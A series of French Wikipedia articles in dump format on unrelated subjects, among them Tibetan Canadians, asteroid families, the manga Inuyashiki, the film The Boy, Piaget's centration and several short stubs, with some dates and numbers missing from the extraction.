La majorité des Tibétains-canadiens vivent dans la région métropolitaine de Toronto (estimation ). En 2011, il y avait vivant dans la ville de Toronto. Il y a une communauté tibétaine importante dans les entreprises et restaurants tibétains , connu sous le nom de , dans le quartier de Parkdale de Toronto, dans la région située entre Queen St. W., au nord, l'autoroute Gardiner à l'ouest et au sud, et l'avenue de l'Atlantique à l'est. Il y a aussi une communauté tibétaine grandissante à Etobicoke Sud
Canadiens tibétains notables.
Bhutila Karpoche, membre de l'Assemblée législative de l'Ontario et la première personne d'origine tibétaine jamais élue à une fonction publique en Amérique du Nord.

</doc>
<doc id="9623549" url="https://fr.wikipedia.org/wiki?curid=9623549" title="Linwood (Écosse)">
Linwood (Écosse)

Linwood est une ville d'Écosse, située dans le council area et région de lieutenance du Renfrewshire.
Située à 23 kilomètres au sud-ouest de Glasgow, la ville a été profondément marquée par la présence sur son territoire d'une usine de construction de voitures. Sa construction commence en 1961 pour ouvrir le en présence de Philip Mountbatten, duc d'Édimbourg, avec la production de la petite voiture Hillman Imp de Rootes Motors devenu par la suite Chrysler Europe. La production de ce modèle continua jusqu'en 1976. L'usine produit aussi des , sous ce nom puis sous celui de Chrysler Avenger et enfin celui de Talbot Avenger, ainsi que des Chrysler Sunbeam, vendues aussi sous le nom de Talbot Sunbeam.
L'usine ferma en 1981 car la direction de Peugeot Talbot décida de regrouper ses activités dans l'usine de , à côté de Coventry. L'usine fut démolie en grande partie très rapidement après, les derniers vestiges étant démolis en 1996. Cette fermeture a laissé de nombreuses personnes au chômage. La chanson "" du groupe écossais The Proclaimers fait directement référence à cette fermeture.

</doc>
<doc id="9623576" url="https://fr.wikipedia.org/wiki?curid=9623576" title="Bouli Miro">
Bouli Miro

Bouli Miro est une pièce de théâtre de comédie pour la jeunesse, écrite par Fabrice Melquiot et publiée pour la première fois par les éditions L'Arche en .
L'histoire est suivie de "Bouli redéboule", sorti en 2005 puis de deux autres suites, soit "Wanted Petula" et "Bouli année zéro".
Synopsis.
Bouli naît obèse, avec neuf kilos, et dans une famille étrange. Il va devoir supporter moqueries et blessures intempestives de ses camarades. Lui et sa cousine Petula vont tomber amoureux l'un de l'autre. Va s'ensuivre de nombreuses gaffes et autres bévues, dont une grande fugue pour se faire marier par la reine d'Angleterre, Élisabeth II.
Cette aventure, avec ses personnages (de tous les âges) loufoques mais attachants, raconte la vie vue par un enfant, sous un aspect très comique.
Personnages.
Principaux.
Ce sont deux frères et sœurs orphelins qui fuient l'Albanie, leur pays natal, qui est en guerre.
Représentations.
La première représentation de "Bouli Miro" eut lieu le au "Théâtre des Jeunes Années" à Lyon avec une mise en scène de Patrice Douchet. Les comédiens étaient Jacques Courtès, Sébastien Crinon, Stéphane Jaubertie, Marème N'Diaye et Elsa Royer. Il s'agit de la première pièce pour jeune public présentée à la Comédie-Française, en .
"Bouli Miro" est également représentée par la compagnie "Vent de passage" au Festival d'Avignon en 2015 avec une mise en scène d'Anna Gérault.
Une version radiophonique réalisée par Marguerite Gateau est diffusée du 24 au sur France Culture durant l'émission "Le Pince-oreille" de Nelly Le Normand.

</doc>
<doc id="9623577" url="https://fr.wikipedia.org/wiki?curid=9623577" title="Markus Jürgenson">
Markus Jürgenson

Markus Jürgenson, né le à Tartu en Estonie, est un footballeur international estonien, qui évolue au poste de défenseur.
Biographie.
Carrière de joueur.
Markus Jürgenson dispute trois matchs en Ligue des champions, dix matchs en Ligue Europa, et un match en Coupe Intertoto.
Carrière internationale.
Markus Jürgenson compte 7 sélections avec l'équipe d'Estonie depuis 2010. 
Il est convoqué pour la première fois par le sélectionneur national Tarmo Rüütli pour un match amical contre la Chine le (défaite 3-0).

</doc>
<doc id="9623578" url="https://fr.wikipedia.org/wiki?curid=9623578" title="Famille de planètes mineures">
Famille de planètes mineures

Une famille de planètes mineures, famille d'astéroïdes, famille de Hirayama, ou encore famille collisionnelle, est un ensemble de planètes mineures qui partagent des éléments orbitaux similaires (tels que le demi-grand axe, l'excentricité ou l'inclinaison orbitale) et qui sont supposés être des fragments de collisions passées entre astéroïdes.
Ces familles se rencontrent notamment au sein de la ceinture principale d'astéroïdes, ce qui explique que le terme famille d'astéroïdes soit le plus courant. Les découvertes de familles parmi les troyens de Jupiter et, en 2006, au sein de la ceinture de Kuiper conduisent progressivement à généraliser le concept à celui de famille de planètes mineures.
Cette notion de famille est à distinguer de celle de groupe. Il s'agit dans les deux cas d'ensembles de planètes mineures partageant des propriétés orbitales voisines mais les groupes découlent seulement de phénomènes dynamiques (et non de collisions) et jouent un rôle plus structurant dans la disposition des planètes mineures au sein du Système solaire.
Histoire.
L'astronome japonais Kiyotsugu Hirayama (1874–1943) est le premier à théoriser la notion de famille. Son article fondateur "Groups of asteroids probably of common origin", publié en 1918, met en évidence, parmi les 790 astéroïdes alors référencées, trois premières familles qu'il nomme d'après leurs membres de plus petit numéro : Coronis (13 membres identifiés), Éos (19) et Thémis (22). Il introduit le terme de famille et - sans la nommer - la notion d'éléments orbitaux propres qui lui permet de mettre en évidence l'origine commune des membres de chaque famille. Il reconnait par la suite d'autres familles dont celles de Flore et de Maria.
Dirk Brouwer poursuit ces travaux dans les années 1950 et affine les méthodes statistiques d'identification des familles. De nouvelles familles sont progressivement identifiées mais des divergences importantes existent entre astronomes, tant sur les critères à utiliser que sur la liste des familles à retenir. Dans les années 1980, le nombre de familles identifiées peut varier de 15 à 117 suivant les auteurs et le consensus ne concerne que les familles "classiques" identifiées par Hirayama.
L'étude des familles fait un bond dans les années 1990 et 2000 grâce à l'augmentation rapide du nombre de planètes mineures référencées et, parallèlement, de la puissance de traitements statistiques, mais aussi et surtout grâce l'apparition progressive d'un consensus sur des méthodes d'identification plus rigoureuses (HCM, WAM, D-criterion...). Une étude publiée en 1995 et basée sur un échantillon d'environ identifie 26 familles bien caractérisées.
Généralités.
Terminologie.
La notion de famille est la notion générique. Les petites familles sont souvent désignées par le terme anglais de cluster . Le terme paire est utilisé dans le cas extrême d'un ensemble réduit à seulement deux objets gravitant conjointement. Certains astronomes ont proposé d'autres termes (clan, tribu, ...) pour décrire la diversité des situations (familles plus ou moins nettes, plus ou moins isolées...) mais leur usage reste peu fréquent.
Dénomination.
Plusieurs usages cohabitent. L'usage le plus fréquent a été de désigner les familles (de même d'ailleurs que les groupes) par le nom de leurs membres de plus petit numéro. Un autre usage est de privilégier le nom du plus grand membre, ce qui est cohérent avec le fait que le plus grand membre est souvent considéré comme le "membre parent".
Ces deux usages expliquent en partie pourquoi de nombreuses familles sont désignées par des noms différents suivant les époques ou suivant les auteurs, au fur et à mesure du raffinement des méthodes d'études : découverte d'un nouveau membre plus grand, inclusion d'un nouveau membre de plus petit numéro, exclusion du membre ayant initialement donné son nom à la famille
Les astronomes David Nesvorný, Miroslav Brož et Valerio Carruba ont proposé en 2015 un système visant à fixer une dénomination stable et partagée aux familles les mieux caractérisées. Ce système repose sur l'attribution d'un numéro à 3 chiffres appelé "Family Identifier Number" ou FIN. Le premier chiffre indique la zone du Système solaire concernée :
Ce système est depuis repris par d'autres astronomes.
Nombre de familles.
Le dénombrement exact des familles est par nature impossible. Leur caractérisation par des méthodes statistiques génère de nombreux cas limites. Par ailleurs de nouvelles familles sont régulièrement proposées et font l'objet de débats avant leur acceptation ou réfutation. Certaines peuvent rester longtemps au statut d'hypothèse.
Des études de synthèse sont régulièrement publiées et permettent d'affiner progressivement la liste des familles les mieux établies. L'une d'elles, publiée en 2015 par D. Nesvorny, M. Broz et V. Carruba, recense 122 familles auxquelles on peut ajouter la famille d'Eurêka et la famille d'Hauméa, non traitées dans le cadre de l'étude. Elle propose par ailleurs une liste additionnelle de 19 familles candidates.
Origine et dynamique des familles.
Origine.
Les familles sont interprétées comme résultant de collisions entre astéroïdes. Cette interprétation est proposée dès les travaux fondateurs de K. Hirayama dans les années 1920 et s'est progressivement affirmée. Dans la plupart des cas, la collision est supposée avoir entraîné la destruction des deux corps parents. Dans quelques cas, au contraire, la collision est interprétée comme un impact de cratérisation. C'est par exemple le cas pour les familles de Vesta (hypothèse d'un lien avec le cratère Rheasilvia sur (4) Vesta), de Junon, de Pallas, d'Hygie ou de Massalia. On parle parfois dans ce cas de famille de cratérisation ("cratering familly" en anglais).
L'origine collisionnelle explique que, dans la grande majorité des cas, les membres d'une famille possèdent une homogénéité de composition (supposée à travers les propriétés spectrales). Cet aspect est utilisé, en complément des éléments orbitaux propres, pour affiner l'identification des familles et pour repérer les éventuels intrus ne faisant pas partie d'une famille. Les cas de cratérisation de gros corps différenciés peuvent toutefois faire exception.
Les très petites familles, en particulier celles isolées comme la famille d'Eurêka au sein des troyens de Mars, ont conduit à envisager d'autres scénarios, par exemple des ruptures successives d'un petit corps causées par l'effet YORP. L'hypothèse d'une collision reste toutefois le plus souvent privilégiée.
Dynamique et évolution.
Lors d'une collision, les vitesses relatives entre les fragments générés restent faibles comparées à la vitesse de déplacement des astéroïdes sur leurs orbites. C'est ce qui explique que les familles mettent plusieurs millions d'années pour se disperser et restent ainsi identifiables à travers l'étude des éléments orbitaux. Les petits fragments sont en général éjectés avec une plus grande vitesse et se dispersent donc plus rapidement.
L'influence gravitationnelle des planètes (en particulier de Jupiter dans le cas des familles de la ceinture principale) perturbent les orbites des fragments de manière différenciée et vient accélérer la dispersion. Le calcul des paramètres orbitaux propres permet de s'affranchir de ce phénomène et ainsi d'identifier plus facilement et de manière plus pertinente les familles, en particulier les plus anciennes.
D'autres effets non gravitationnels viennent perturber de manière différenciée les orbites des fragments, en particulier les effets Yarkovsky et YORP liés à la lumière du Soleil. Ces phénomènes affectent plus particulièrement les petits membres de la famille, venant encore renforcer leur dispersion déjà plus rapide. L'étude de la répartition des fragments selon leur taille permet ainsi d'estimer l'âge des familles, c'est-à-dire le moment de la collision.
Éléments orbitaux propres.
De manière stricte, l'adhésion d'un astéroïde à une famille donnée se fait par l'analyse de ses éléments orbitaux propres, plutôt que par ses éléments orbitaux osculateurs, ces derniers variant régulièrement sur des échelles de temps de plusieurs dizaines de milliers d'années. Les éléments orbitaux propres sont quant à eux des constantes liées au mouvement censées rester quasi constantes sur des périodes d'au moins plusieurs dizaines de millions d'années.
Familles de la ceinture principale d'astéroïdes.
Disposition des familles au sein de la ceinture principale.
La ceinture principale est classiquement divisée en plusieurs sous-groupes liés, notamment, aux lacunes de Kirkwood. Plusieurs découpages sont possibles. Nous retenons ici le découpage suivant :
La grande majorité des familles connues se concentrent dans les zones I, II et III de la ceinture principale. La plupart ont une inclinaison moyenne inférieure à 20°.
Les régions périphériques, beaucoup moins denses en astéroïdes, concentrent peu de familles. Ces régions sont traitées dans la section Familles des groupes périphériques de la ceinture principale.
Importances des familles dans la description de la ceinture principale.
Suivant les estimations, entre un quart et un tiers des astéroïdes de la ceinture principale sont connues comme appartenant à une famille.
Liste des familles.
L'article Liste de familles de planètes mineures donne une liste détaillée des familles.
Familles des groupes périphériques de la ceinture principale.
Troyens de Mars.
L'hypothèse d'une famille parmi les troyens de Mars gravitant en est formulée en 2013 et ce parallèlement par les astronomes espagnols C. et R. de la Fuente Marcos et par l'astronome anglais Apostolos Christou. Elle est classiquement nommée famille d'Eurêka, d'après son membre à la fois le plus grand et de plus petit numéro . Il est aujourd'hui établi qu'elle regroupe 7 des 8 astéroïdes gravitant en L5.
Groupe de Hungaria.
Le groupe de Hungaria est un groupe d'astéroïdes de faible excentricité et d'inclinaison moyenne (typiquement entre 15 et 35°) situé entre Mars et la ceinture principale (typiquement 1,8 &lt; a &lt; ). On distingue en son sein une famille collisionnelle désignée en tant que famille de Hungaria. Cette famille contient une majorité des astéroïdes du groupe mais il s'agit bien de deux ensembles distincts. La distinction entre le groupe et la famille n'a été clairement proposée qu'en 1994.
Groupe de Cybèle.
Le groupe de Cybèle est situé en périphérie externe de la ceinture principale, entre les lacunes de Kirkwood liées aux résonances 2:1 et 5:3 avec Jupiter, c'est-à-dire dans la zone . Plusieurs familles collisionnelles ont été découvertes dans cette région. La première à avoir été clairement identifiée est la famille de Sylvia en 2010. Deux autres familles sont aujourd'hui bien documentées, la famille d'Ulla et la famille de Huberta. D'autres familles (par exemple autour des astéroïdes , , , , ou ) ont été proposées mais ne font pas (ou pas encore) consensus.
Groupe de Hilda.
Le groupe de Hilda est directement lié à un phénomène de résonance orbitale avec Jupiter, au niveau de la résonance 3:2, aux environs de . Deux familles collisionnelles ont été identifiées au sein de ce groupe : la famille de Hilda et la famille de Schubart.
Troyens de Jupiter.
L'étude des familles au sein des troyens de Jupiter s'est avérée difficile. Des études publiées à la fin des années 1980 puis au cours des années 1990 ou 2000 ont proposé d'abord des paires d'astéroïdes ou des petits cluster, puis des familles plus importantes. Mais une étude publiée en 2011 a par la suite montré que, parmi toutes celles jusqu'alors envisagées, seule la famille d'Eurybate s'avérait statistiquement robuste. On peut donc aujourd'hui considérer la famille d'Eurybate comme la première à avoir été clairement identifiée au sein des troyens de Jupiter. Depuis, de nouvelles familles ont été proposées, en particulier des familles impliquant principalement des troyens de petite taille découverts après 2000.
Deux études de synthèse publiées en 2015 et 2016, basées respectivement sur des échantillons de 4016 et 5852 troyens, recensent 6 familles, dont 4 en et 2 en . On peut en particulier citer les familles d'Eurybate (en , environ 310 membres), d'Ennomos (en , environ 100 membres) et d'Hector (en , environ 90 membres).
La famille d'Hector semble regrouper des astéroïdes de type D, ce qui en ferait la première famille collisionnelle de ce type identifiée au sein du Système solaire.
Familles de la ceinture de Kuiper.
La famille de Hauméa est la première famille identifiée, en 2006, au sein de la ceinture de Kuiper. Elle reste en 2013 la seule famille transneptunienne clairement identifiée. Elle compte une dizaine de membres dont sans doute les deux petites lunes de Hauméa. Une étude publiée en 2008 estime plus probable que l'origine de cette famille soit un choc entre deux objets épars de forte excentricité plutôt qu'entre deux objets de la ceinture de Kuiper elle même.

</doc>
<doc id="9623581" url="https://fr.wikipedia.org/wiki?curid=9623581" title="Last Hero Inuyashiki">
Last Hero Inuyashiki

 est un seinen manga écrit et dessiné par Hiroya Oku. Il est prépublié entre et dans le magazine "Evening" et est édité en dix volume reliés par Kōdansha entre et . La version française est publiée par Ki-oon depuis .
Une adaptation en "anime" par le studio MAPPA est diffusée entre et sur Fuji TV dans la case horaire noitaminA. Une adaptation en film live est sortie en .
Synopsis.
Ichirō Inuyashiki n'a rien pour lui. Âgé de 58 ans, il paraît nettement plus vieux. Sa santé se dégrade et sa famille le méprise. Son seul soutien moral vient de sa chienne "shiba" Hanako. Alors qu'il vient d'apprendre qu'il va mourir sous peu d'un cancer, il sort une nuit pleurer de désespoir dans un parc. L'inattendu survient alors : il est frappé par une navette extraterrestre et meurt sur le coup, mais pour effacer les traces de leurs passages, ils reconstruisent son corps. Cependant, comme les extraterrestres n'avaient sous la main que de l'équipement offensif, pouvant détruire la planète, ils transforment alors le corps du petit vieillard en un cyborg aux immenses pouvoirs. Quand il réalise peu à peu les capacités que son nouveau corps lui offre, il décide de faire le bien et de garder une part d'humanité.
Cependant, un adolescent qui était avec lui au moment de l'explosion, Hiro Shishigami, a subi le même sort qu'Ichirō. Mais contrairement à ce dernier, Hiro devient un sociopathe qui utilise ses nouvelles capacités pour assassiner des gens pour son seul amusement, qu'il s'agisse de ses camarades de classe qui l'agacent ou des familles innocentes, y compris des jeunes enfants. Ses actes de cruauté impitoyable lui attirent l'attention de la police, qui ne peut rien faire pour l'arrêter, même s'il ne faut pas longtemps à Hiro pour devenir le criminel le plus recherché et le plus dangereux du pays. La série continue alors à explorer le parcours de ces deux individus différents, qui ont jadis partagé la même expérience bizarre, jusqu'à leur confrontation inévitable.
Manga.
"Inuyashiki" est écrit et dessiné par Hiroya Oku, le manga a commencé à être publié dans le numéro 2014 du magazine Evening de l'éditeur Kodansha publié le 28 janvier 2014. Le manga s'est terminé dans le numéro 2017 du magazine Evening publié le 25 juillet 2017. Kodansha a compilé la série en dix volumes "tankōbon" publiés entre le 23 mai 2014 et le 22 septembre 2017.
La version française est publiée par Ki-oon depuis le .
Anime.
Le , il a été révélé lors d'un événement diffusé en direct sur la case horaire noitaminA de Fuji TV que le manga est adapté en "série télévisée d'animation". La série est réalisée par Shuhei Yabuta et avec Keiichi Satō en tant que réalisateur en chef au studio d'animation MAPPA, Hiroshi Seko s'occupe du scénario, et Naoyuki Onda en est le "character designer". Composée de 11 épisodes, celle-ci est diffusée pour la première fois entre le et le au Japon sur Fuji TV dans la case horaire noitaminA. Le service de vidéo à la demande d'Amazon.com, Amazon Prime Video, détient les droits exclusifs de diffusion de la série en simulcast au Japon et à l'étranger.
Lopening", intitulé "My Hero", est réalisé par le groupe de rock japonais Man with a Mission tandis que le groupe Qajiff a réalisé lending" intitulé .
Film en prise de vues réelles.
Une adaptation en film en prise de vues réelles a également été révélée lors de l'événement diffusé en direct sur noitaminA de Fuji TV. Le film est sorti le avec Shinsuke Satō comme réalisateur. Noritake Kinashi joue le rôle d'Ichirō Inuyashiki et Takeru Satoh celui de Hiro Shishigami; Yūsuke Iseya est le détective Hagiwara, un personnage original du film qui enquête sur les meurtres de Hiro. MAN WITH A MISSION interprète la chanson thème du film intitulée . Une avant-première mondiale de l'adaptation cinématographique a eu lieu le , durant le .
Accueil.
Ventes.
En avril 2018, le tirage de la série s'élève à plus de 3,1 millions d'exemplaires en circulation. Le du manga a atteint la sur le classement hebdomadaire des mangas de l'Oricon et s'est vendu en exemplaires au ; le a atteint la et, au , s'est vendu à exemplaires.
Réception critique.
Pour Pauline Croquet du "Monde", .
En février 2021, il a été signalé que la série, ainsi que "Death Note" et "Tokyo Ghoul", avaient été interdites de distribution sur deux sites Web non spécifiés en Russie.
Distinctions.
Manga.
La série était l'une des sélections du jury de la division Manga aux et Japan Media Arts Festival en 2014 et 2015. ' a reçu le Daruma d'Or du jury lors des Japan Expo Awards de 2016. La série est nommée en sélection officielle du Festival d'Angoulême 2017. ' a été nommé dans la catégorie Meilleure bande dessinée aux Prix Seiun en 2018.
Anime.
Lors des Anime Awards 2017 de Crunchyroll, la série d'animation a été nommée dans la catégorie « Meilleur CGI » et Hiro Shishigami dans celle du « Méchant de l'année ».
Film live-action.
"Inuyashiki" a remporté le prix de l'excellence dans la catégorie Film théâtral d'action en direct et a été nommé dans la catégorie Grand Prix des "VFX-Japan Awards" 2019. L'adaptation cinématographique de la série a également remporté le Corbeau d'or au en 2018. Sorti dans 313 salles, le film a débuté à la du box-office japonais lors de son premier weekend et a rapporté 124 millions de yens pour billets vendus. Au 6 mai 2018, le film avait rapporté un total de yens (environ 5,63 millions de dollars).

</doc>
<doc id="9623582" url="https://fr.wikipedia.org/wiki?curid=9623582" title="Inuyashiki">
Inuyashiki



</doc>
<doc id="9623589" url="https://fr.wikipedia.org/wiki?curid=9623589" title="Edwin Taylor Pollock">
Edwin Taylor Pollock

 | emblème = Coat of Arms of American Samoa.svg
 | liste = Liste des gouverneurs des Samoa américaines
Edwin Taylor Pollock (né le à Mount Gilead et mort le à Washington) est un officier dans l'United States Navy. Il combat lors de la guerre hispano-américaine ainsi que lors de la Première Guerre mondiale. Il est par la suite promu "captain". Comme beaucoup d'officiers navals, son nom est abrégé par ses initiales : Pollock.
En tant qu'enseigne, Pollock sert à bord de  l' pendant la guerre hispano-américaine. Après la guerre, il sert sur de nombreux navires, et fait des recherches sur les communications sans fil. Pendant la guerre, il est promu capitaine et un navire sous ses ordres transporte américains en France. Il reçoit la Navy Cross pour ses faits de guerre.
Peu après, il est fait huitième gouverneur naval des Samoa américaines et directeur de l'Observatoire naval des États-Unis, avant de prendre sa retraite en 1927.

</doc>
<doc id="9623605" url="https://fr.wikipedia.org/wiki?curid=9623605" title="Famille de Haveskercke">
Famille de Haveskercke

La famille de Haveskercke est une très ancienne famille belge subsistante originaire de l'ancien comté de Flandres. Son ascendance prouvée remonte à 1137 ce qui en fait la la plus ancienne de Belgique.
Héraldique.
Blasonnement : "D'or à la fasce de gueules".
Alliances.
de Haynin, d'Escornaix, de Stavele d'Isenghien, de Waele, van Heule d'Oostvleteren, de Nédonchel dit Agniaux, van den Berghe de Watervliet, van Catthem, Walckiers, de Longpré, van Zedelghem, de Caestre, van Themseke, (…).
Famille Meeûs

</doc>
<doc id="9623620" url="https://fr.wikipedia.org/wiki?curid=9623620" title="The Book of Gabrielle">
The Book of Gabrielle

The Book of Gabrielle est un film britannique de 2015 écrit et réalisé par Lisa Gornick.

</doc>
<doc id="9623625" url="https://fr.wikipedia.org/wiki?curid=9623625" title="Rosalinda Celentano">
Rosalinda Celentano

Rosalinda Celentano est une actrice et chanteuse italienne née le à Rome.
Fille de Adriano Celentano et Claudia Mori, elle a notamment joué le rôle de Satan dans "La Passion du Christ".
Biographie.
En 1990, elle s'essaye à une carrière de chanteuse, apparaissant avec la chanson "The Golden Age" au festival de Sanremo, où elle atteint la finale dans la section jeunesse. L'année suivante, elle remporte ce qui était la dernière édition de la section du disque vert de la Festivalbar avec la chanson "Combien de trains". En 1994, elle conduit pour le réseau SuperSix Videoone avec DJ Roberto Onofri pour 150 épisodes puis, en , est la marraine et présentatrice de la première édition de l'Étrurie Cinema Award, entièrement consacrée au cinéma fait par les femmes. En 2004, elle est connue par le public international pour son rôle de Satan dans le film de Mel Gibson, "La Passion du Christ" et reçoit également un prix au Festival de Global Film d'Ischia, la même année.
En 2020, elle participe à la saison de l'émission "Ballando con le stelle".

</doc>
<doc id="9623636" url="https://fr.wikipedia.org/wiki?curid=9623636" title="Jean-Paul de Rome d'Ardène">
Jean-Paul de Rome d'Ardène

Le père Jean-Paul de Rome d'Ardène, né le à Mane (Alpes-de-Haute-Provence) et mort le au "domaine d'Ardène" à Saint-Michel (aujourd'hui Saint-Michel-l'Observatoire, Alpes-de-Haute-Provence) est un botaniste français.
Famille.
Jean-Paul de Rome d'Ardène est le fils d’Honoré de Rome sieur d’Ardène, "commissaire des galères et inspecteur des bois et forêts de Provence", qui fit construire le Château d’Ardène en 1686 et de Antoinette Leroy, fille de Jean Leroy, "conseiller du Roi et contrôleur général de la marine du Levant et des galères de France". Son frère aîné, Esprit-Jean de Rome d'Ardène (1684-1748) est un auteur et un fabuliste reconnu.
Biographie.
Adolescent, Jean-Paul de Rome d'Ardène étudie la rhétorique et la philosophie au collège de Marseille, puis il est admis à l’Oratoire d’Aix en Provence en 1708. Il fait ensuite, des études de théologie à Arles avant d'enseigner les humanités à Marseille. De santé fragile, il est rapidement déchargé de ses fonctions et en 1714, on l'autorise à se retirer et à retourner vivre sur les terres de sa famille, à Ardène. Faisant toujours partie de l'Oratoire d'Aix tout en demeurant à Ardène, il est ordonné prêtre en 1718. Il se consacre alors à la botanique et il va écrire de nombreux ouvrages sur la culture des fleurs ("Traité des renoncules" (1746), "Traité des jacinthes" (1759), ...) qui vont connaître un franc succès auprès de ses contemporains. De plus, faisant bénéficier son entourage de sa connaissance des plantes médicinales et passionné par leur étude, il publie les "Lettres sur l’exercice de la médecine" en 1759.
Il publie en 1767, les "Œuvres posthumes de Monsieur d'Ardene, associé a l'académie des Belles-Lettres de Marseille" qui sont les œuvres posthumes de son frère Esprit-Jean de Rome d'Ardène, décédé en 1748, qu'il a rassemblées et compilées.

</doc>
<doc id="9623645" url="https://fr.wikipedia.org/wiki?curid=9623645" title="The Boy (film, 2016)">
The Boy (film, 2016)

 ou Le garçon au Québec est un film d'horreur sino-canado-britannico-américain réalisé par William Brent Bell, sorti en 2016. 
Une suite, ", est sortie en 2020. Elle sera moins bien reçue par le public et la presse spécialisée, ne cumulant qu'une moyenne de 2,4 sur 5 sur Allociné. 
Synopsis.
Pour essayer d’échapper à Cole, son ex compagnon, qui la battait et qui lui fit subir une fausse couche, une jeune Américaine prénommée Greta (Lauren Cohan) se fait engager comme baby-sitter en Angleterre, dans un château perdu en pleine campagne. 
À son arrivée dans la demeure, la jeune femme découvre qu’elle a été embauchée (et même peut-être « choisie ») par un couple de personnes visiblement très âgées, non pas pour s’occuper d’un petit garçon de huit ans en chair et en os, mais d’une poupée de porcelaine grandeur nature représentant un enfant du même âge. Ce couple lui confie cette poupée, qu'il nomme Brahms, en lui remettant des consignes bien précises (consistant en dix règles de conduite), puis ils quittent la demeure pour mettre fin à leurs jours en allant se noyer ensemble dans un lac.
Seule et loin de tout (mais ignorant la mort des propriétaires de la maison), Greta doit s'occuper de cette étrange poupée que pourtant d'abord elle rejette, puis ignore totalement. Mais, peu à peu, la jeune femme assiste à des événements tous plus étranges les uns que les autres. De temps en temps, elle reçoit la visite d'un jeune épicier qui vient livrer de la nourriture pour elle et la poupée. Ce jeune homme, prénommé Malcolm, finit par lui expliquer que la poupée représente, en fait, le petit Brahms, jeune fils de huit ans de ce vieux couple et mort voici vingt ans dans des circonstances tragiques. Afin de prouver ce fait, Malcolm emmène Greta devant la tombe de Brahms. Dans le village voisin, courent, d'ailleurs, de curieuses rumeurs expliquant que ce jeune garçon serait à l'origine de sa propre mort et de celle d'une petite fille.
Distribution.
Source et légende : 
Accueil.
Critiques.
À sa sortie en France, "" reçu un accueil plutôt favorable ; sur AlloCiné, il reçut une note de 3.2/5 de la part de la presse, basée sur 8 critiques. Aurélien Ferenczi de "Télérama" souligne : « Loin d'exploiter l'étrangeté poétique de son intrigue, le réalisateur abuse de vieux effets : cauchemars récurrents, bruitages tonitruants... Le dernier tiers (...) surprend davantage. Sans dérive gore. Au point qu'on recommanderait presque ce petit film d'horreur pour une initiation au genre ».

</doc>
<doc id="9623671" url="https://fr.wikipedia.org/wiki?curid=9623671" title="Discographie de Jul">
Discographie de Jul

La discographie du rappeur français Jul est composée de 25 albums studio et 12 mixtapes. Elle comprend également des dizaines de singles ainsi que de nombreux clips vidéos.
Depuis février 2020, Jul est le plus gros vendeur de disques de l'histoire du rap français. En 2023, il dépasse les 7 millions de ventes.
Durant sa carrière, il a obtenu de nombreux disques de certification.

</doc>
<doc id="9623678" url="https://fr.wikipedia.org/wiki?curid=9623678" title="Centration">
Centration

En psychologie, la centration est la tendance à se concentrer sur un aspect saillant d'une situation et à négliger d'autres aspects éventuellement pertinents. Introduite par le psychologue suisse Jean Piaget dans sa théorie des paliers d'acquisition, la centration est un comportement souvent manifesté au stade préopératoire. Piaget affirme que l'égocentrisme, un élément commun responsable de la pensée non systématique des enfants préopérationnels, est à l'origine de la centration. Les recherches sur la centration ont principalement été menées par Piaget, par le biais de ses tâches de conservation, tandis que des chercheurs contemporains ont développé ses idées.

</doc>
<doc id="9623696" url="https://fr.wikipedia.org/wiki?curid=9623696" title="Joseph Trapanese">
Joseph Trapanese

Joseph Trapanese est un compositeur américain de musiques de films.

</doc>
<doc id="9623704" url="https://fr.wikipedia.org/wiki?curid=9623704" title="Godde">
Godde



</doc>
<doc id="9623707" url="https://fr.wikipedia.org/wiki?curid=9623707" title="Endless">
Endless

 est un mot anglais signifiant « éternel ». Il peut faire référence à :

</doc>
<doc id="9623714" url="https://fr.wikipedia.org/wiki?curid=9623714" title="Bad Marienberg">
Bad Marienberg



</doc>
<doc id="9623719" url="https://fr.wikipedia.org/wiki?curid=9623719" title="Compagnie des bateaux du lac Léman">
Compagnie des bateaux du lac Léman

La Compagnie des bateaux du Lac Léman est une compagnie de navigation fondée à Thonon-les-Bains en 2012. Elle exploite actuellement un bateau sur le Lac Léman.
Histoire.
La Compagnie des bateaux du Lac Léman a été fondé en 2012 par Didier Goyet lorsque celui-ci achète le bateau "Village de Chanaz" de la Compagnie des Bateaux du lac du Bourget et du Haut-Rhône. Le bateau est ramené jusqu’à Thonon-les-Bains où il est mis à l’eau le . Rebaptisé "L’Albran", il est mis en service au printemps 2013.
Parcours.
La compagnie propose des croisières d’une heure au départ de Thonon-les-Bains.

</doc>
<doc id="9623720" url="https://fr.wikipedia.org/wiki?curid=9623720" title="Elsoff">
Elsoff



</doc>
<doc id="9623733" url="https://fr.wikipedia.org/wiki?curid=9623733" title="Albrecht Agthe">
Albrecht Agthe

Albrecht Agthe (né le à Ballenstedt et mort le à Berlin) est un professeur de musique allemand.
Biographie.
Agthe est le fils de Carl Christian Agthe, un organiste et compositeur de la cour. Il a étudié avec à Erfurt. En 1810 il est devenu professeur de musique à Leipzig et membre comme violoniste de l'Orchestre du Gewandhaus de Leipzig. En 1823, il a commencé à enseigner en utilisant la méthode de à Dresde. À partir de 1826, il a enseigné à Posen (où il a eu comme élève Theodor Kullak et ); à partir de 1830 à Breslau; et partir de 1832 à Berlin, où il a dirigé une école de musique pendant 13 ans.
Agthe est l'auteur d'ouvertures, de musique d'église, de pièces pour piano et de lieder.

</doc>
<doc id="9623734" url="https://fr.wikipedia.org/wiki?curid=9623734" title="Remember My Name (album)">
Remember My Name (album)

 est le premier album studio du rappeur américain Lil Durk, sorti le .
L'album s'est classé à la du Billboard 200 à la semaine de sa sortie.

</doc>
<doc id="9623735" url="https://fr.wikipedia.org/wiki?curid=9623735" title="Gerhard Schiller">
Gerhard Schiller

Gerhard Schiller, né le à Stuttgart, est un ancien nageur de l'Allemagne de l'Ouest qui a participé aux Jeux olympiques d'été de 1972.

</doc>
<doc id="9623736" url="https://fr.wikipedia.org/wiki?curid=9623736" title="Forever Free (album de Saxon)">
Forever Free (album de Saxon)

Forever Free est le album studio du groupe britannique Saxon, sorti le 18 mai 1992.

</doc>
<doc id="9623737" url="https://fr.wikipedia.org/wiki?curid=9623737" title="Herschbach (Wallmerod)">
Herschbach (Wallmerod)



</doc>
<doc id="9623742" url="https://fr.wikipedia.org/wiki?curid=9623742" title="Filly (Houffalize)">
Filly (Houffalize)

Filly est un hameau de la ville belge d'Houffalize situé en Région wallonne dans la province de Luxembourg.
Avant la fusion des communes de 1977, Filly faisait partie de la commune de Nadrin.
Situation.
Filly est un hameau ardennais situé à proximité de la confluence des deux Ourthe près des villages de Nadrin, Wibrin et Mormont. Bien protégé, il s'étend en tête d'un vallon où nait le ruisseau de Filly, affluent de l'Ourthe.
Description et patrimoine.
